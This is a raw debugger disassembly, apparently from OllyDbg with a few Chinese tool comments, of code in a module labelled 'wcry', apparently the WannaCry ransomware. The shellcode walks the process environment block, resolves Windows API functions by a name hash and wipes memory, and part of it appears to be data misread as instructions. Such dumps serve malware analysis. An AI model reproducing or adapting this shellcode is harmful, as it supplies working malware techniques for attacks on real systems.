004029FD        48                      DEC EAX
004029FE        8D0D CAFFFFFF           LEA ECX,DWORD PTR DS:[FFFFFFCA]
00402A04        48                      DEC EAX
00402A05        83EC 20                 SUB ESP,20
00402A08        FF56 40                 CALL DWORD PTR DS:[ESI+40]
00402A0B        48                      DEC EAX
00402A0C        83C4 20                 ADD ESP,20
00402A0F        E9 11010000             JMP wcry.00402B25
00402A14        4C                      DEC ESP
00402A15        89C6                    MOV ESI,EAX
00402A17        E9 09010000             JMP wcry.00402B25
00402A1C        54                      PUSH ESP
00402A1D        55                      PUSH EBP
00402A1E        51                      PUSH ECX
00402A1F        52                      PUSH EDX
00402A20        53                      PUSH EBX
00402A21        56                      PUSH ESI
00402A22        57                      PUSH EDI
00402A23        48                      DEC EAX
00402A24        31DB                    XOR EBX,EBX
00402A26        65:48                   DEC EAX                                             ;  多余的前缀
00402A28        8B5B 30                 MOV EBX,DWORD PTR DS:[EBX+30]
00402A2B        48                      DEC EAX
00402A2C        8B5B 60                 MOV EBX,DWORD PTR DS:[EBX+60]
00402A2F        48                      DEC EAX
00402A30        8B5B 18                 MOV EBX,DWORD PTR DS:[EBX+18]
00402A33        48                      DEC EAX
00402A34        8B5B 10                 MOV EBX,DWORD PTR DS:[EBX+10]
00402A37        48                      DEC EAX
00402A38        8B73 60                 MOV ESI,DWORD PTR DS:[EBX+60]
00402A3B        48                      DEC EAX
00402A3C        85F6                    TEST ESI,ESI
00402A3E        0F84 A6000000           JE wcry.00402AEA
00402A44        48                      DEC EAX
00402A45        8B6B 30                 MOV EBP,DWORD PTR DS:[EBX+30]
00402A48        48                      DEC EAX
00402A49        85ED                    TEST EBP,EBP
00402A4B        0F84 99000000           JE wcry.00402AEA
00402A51        48                      DEC EAX
00402A52        31D2                    XOR EDX,EDX
00402A54        C1C2 05                 ROL EDX,5
00402A57        66:AD                   LODS WORD PTR DS:[ESI]
00402A59        0C 20                   OR AL,20
00402A5B        30C2                    XOR DL,AL
00402A5D        66:833E 00              CMP WORD PTR DS:[ESI],0
00402A61      ^ 75 F1                   JNZ SHORT wcry.00402A54
00402A63        48                      DEC EAX
00402A64        8B1B                    MOV EBX,DWORD PTR DS:[EBX]
00402A66        48                      DEC EAX
00402A67        3B5424 20               CMP EDX,DWORD PTR SS:[ESP+20]
00402A6B      ^ 75 CA                   JNZ SHORT wcry.00402A37
00402A6D        48                      DEC EAX
00402A6E        89EF                    MOV EDI,EBP
00402A70        66:813F 4D5A            CMP WORD PTR DS:[EDI],5A4D
00402A75        75 73                   JNZ SHORT wcry.00402AEA
00402A77        8B7D 3C                 MOV EDI,DWORD PTR SS:[EBP+3C]
00402A7A        48                      DEC EAX
00402A7B        01EF                    ADD EDI,EBP
00402A7D        813F 50450000           CMP DWORD PTR DS:[EDI],4550
00402A83        75 65                   JNZ SHORT wcry.00402AEA
00402A85        48                      DEC EAX
00402A86        89F9                    MOV ECX,EDI
00402A88        48                      DEC EAX
00402A89        83C1 18                 ADD ECX,18
00402A8C        48                      DEC EAX
00402A8D        85C9                    TEST ECX,ECX
00402A8F        74 59                   JE SHORT wcry.00402AEA
00402A91        48                      DEC EAX
00402A92        31D2                    XOR EDX,EDX
00402A94        8BBF 88000000           MOV EDI,DWORD PTR DS:[EDI+88]
00402A9A        48                      DEC EAX
00402A9B        01EF                    ADD EDI,EBP
00402A9D        8B57 1C                 MOV EDX,DWORD PTR DS:[EDI+1C]
00402AA0        48                      DEC EAX
00402AA1        01EA                    ADD EDX,EBP
00402AA3        8B5F 20                 MOV EBX,DWORD PTR DS:[EDI+20]
00402AA6        48                      DEC EAX
00402AA7        01EB                    ADD EBX,EBP
00402AA9        8B7F 24                 MOV EDI,DWORD PTR DS:[EDI+24]
00402AAC        48                      DEC EAX
00402AAD        01EF                    ADD EDI,EBP
00402AAF        49                      DEC ECX
00402AB0        89D1                    MOV ECX,EDX
00402AB2        8B33                    MOV ESI,DWORD PTR DS:[EBX]
00402AB4        48                      DEC EAX
00402AB5        01EE                    ADD ESI,EBP
00402AB7        48                      DEC EAX
00402AB8        31D2                    XOR EDX,EDX
00402ABA        C1C2 05                 ROL EDX,5
00402ABD        AC                      LODS BYTE PTR DS:[ESI]
00402ABE        0C 20                   OR AL,20
00402AC0        30C2                    XOR DL,AL
00402AC2        803E 00                 CMP BYTE PTR DS:[ESI],0
00402AC5      ^ 75 F3                   JNZ SHORT wcry.00402ABA
00402AC7        48                      DEC EAX
00402AC8        3B5424 18               CMP EDX,DWORD PTR SS:[ESP+18]
00402ACC        74 0C                   JE SHORT wcry.00402ADA
00402ACE        48                      DEC EAX
00402ACF        83C7 02                 ADD EDI,2
00402AD2        48                      DEC EAX
00402AD3        83C3 04                 ADD EBX,4
00402AD6      ^ E2 DA                   LOOPD SHORT wcry.00402AB2
00402AD8        EB 10                   JMP SHORT wcry.00402AEA
00402ADA        48                      DEC EAX
00402ADB        0FB717                  MOVZX EDX,WORD PTR DS:[EDI]
00402ADE        48                      DEC EAX
00402ADF        C1E2 02                 SHL EDX,2
00402AE2        4C                      DEC ESP
00402AE3        01CA                    ADD EDX,ECX
00402AE5        8B02                    MOV EAX,DWORD PTR DS:[EDX]
00402AE7        48                      DEC EAX
00402AE8        01E8                    ADD EAX,EBP
00402AEA        5F                      POP EDI
00402AEB        5E                      POP ESI
00402AEC        5B                      POP EBX
00402AED        5A                      POP EDX
00402AEE        59                      POP ECX
00402AEF        5D                      POP EBP
00402AF0        5C                      POP ESP
00402AF1        C3                      RETN
00402AF2        06                      PUSH ES
00402AF3        DFB0 2C51338A           FBSTP TBYTE PTR DS:[EAX+8A33512C]
00402AF9        8DA400 78952785         LEA ESP,DWORD PTR DS:[EAX+EAX+85279578]
00402B00        003B                    ADD BYTE PTR DS:[EBX],BH
00402B02        00A1 B400DBB6           ADD BYTE PTR DS:[ECX+B6DB00B4],AH
00402B08        B6 E5                   MOV DH,0E5
00402B0A        00C4                    ADD AH,AL
00402B0C        2207                    AND AL,BYTE PTR DS:[EDI]
00402B0E        E2 00                   LOOPD SHORT wcry.00402B10
00402B10        825A 15 4A              SBB BYTE PTR DS:[EDX+15],4A
00402B14        0002                    ADD BYTE PTR DS:[EDX],AL
00402B16        55                      PUSH EBP
00402B17        F0:D6                   LOCK SALC                                           ;  不允许锁定前缀
00402B19        DE79 03                 FIDIVR WORD PTR DS:[ECX+3]
00402B1C        AA                      STOS BYTE PTR ES:[EDI]
00402B1D        8600                    XCHG BYTE PTR DS:[EAX],AL
00402B1F        0D C48ADC00             OR EAX,0DC8AC4
00402B24        0048 8B                 ADD BYTE PTR DS:[EAX-75],CL
00402B27        26:50                   PUSH EAX                                            ;  多余的前缀
00402B29        48                      DEC EAX
00402B2A        31C0                    XOR EAX,EAX
00402B2C        48                      DEC EAX
00402B2D        8D0D 33000000           LEA ECX,DWORD PTR DS:[33]
00402B33        48                      DEC EAX
00402B34        8D1D 2C000000           LEA EBX,DWORD PTR DS:[2C]
00402B3A        48                      DEC EAX
00402B3B        29D9                    SUB ECX,EBX
00402B3D        48                      DEC EAX
00402B3E        89DF                    MOV EDI,EBX
00402B40        F3:AA                   REP STOS BYTE PTR ES:[EDI]
00402B42        48                      DEC EAX
00402B43        8D0D 0D000000           LEA ECX,DWORD PTR DS:[D]
00402B49        48                      DEC EAX
00402B4A        8D1D 96F0FFFF           LEA EBX,DWORD PTR DS:[FFFFF096]
00402B50        48                      DEC EAX
00402B51        29D9                    SUB ECX,EBX
00402B53        48                      DEC EAX
00402B54        89DF                    MOV EDI,EBX
00402B56        F3:AA                   REP STOS BYTE PTR ES:[EDI]
00402B58        58                      POP EAX
00402B59        41                      INC ECX
00402B5A        5F                      POP EDI
00402B5B        41                      INC ECX
00402B5C        5E                      POP ESI
00402B5D        41                      INC ECX
00402B5E        5D                      POP EBP
00402B5F        41                      INC ECX
00402B60        5C                      POP ESP
00402B61        5E                      POP ESI
00402B62        5F                      POP EDI
00402B63        5D                      POP EBP
00402B64        5B                      POP EBX
00402B65        C3                      RETN
00402B66        EB 08                   JMP SHORT wcry.00402B70
00402B68        00D0                    ADD AL,DL
00402B6A        0100                    ADD DWORD PTR DS:[EAX],EAX
00402B6C        0100                    ADD DWORD PTR DS:[EAX],EAX
00402B6E        0000                    ADD BYTE PTR DS:[EAX],AL

